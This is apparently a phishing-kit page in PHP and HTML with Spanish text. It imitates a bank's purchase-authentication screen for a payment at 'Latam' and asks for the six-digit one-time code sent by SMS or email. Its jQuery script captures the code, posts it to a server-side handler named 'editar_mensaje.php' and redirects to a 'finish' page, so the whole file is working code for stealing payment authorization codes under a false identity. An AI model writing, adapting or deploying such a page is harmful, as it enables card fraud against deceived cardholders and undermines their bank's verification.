<?php 



?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/davi.css">

    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		
    <title>Document</title>
</head>
<body>
    <div class="details">
        <img src="/img/fala.png" alt="" srcset="" width="100px">
    <hr>
    <a style="color:black;">Autenticación de compra</a><p></p>
    <br><a style="color:black;">Esta intentando realizar un pago en el comercio Latam. Para poder continuar digite el codigo de seguridad enviado por mensaje de texto o correo electronico.</a><p></p>

    
        <center><a style="color:black;">Código de verificación</a><br>
        <input type="text" name="cDinamica" id="txtOTP" style="" required maxlength="6" minlength="6"><br>
        <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:189px;"></center>
        <p></p>
        <p>
            <br>
        </p>
        <center><a><b>REENVIAR CÓDIGO</b></a></center>
        <a><b>Necesita Ayuda?</b></a>
    </div>


    





    <script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length > 5) {
				const data = {
                    'otp': $("#txtOTP").val()
                };
				console.log(data);
				$.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: {
                        data: data
                    },
                    success: function(response) {
                        const result = JSON.parse(response);
                        if (result.success) {
                            window.location.href = "finish.php";
                        } else {
                            alert('Error al editar el mensaje: ' + result.error);
                        }
                    },
                    error: function(xhr, status, error) {
                        alert('Error en la solicitud AJAX: ' + error);
                    }
                });				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>
</body>
</html>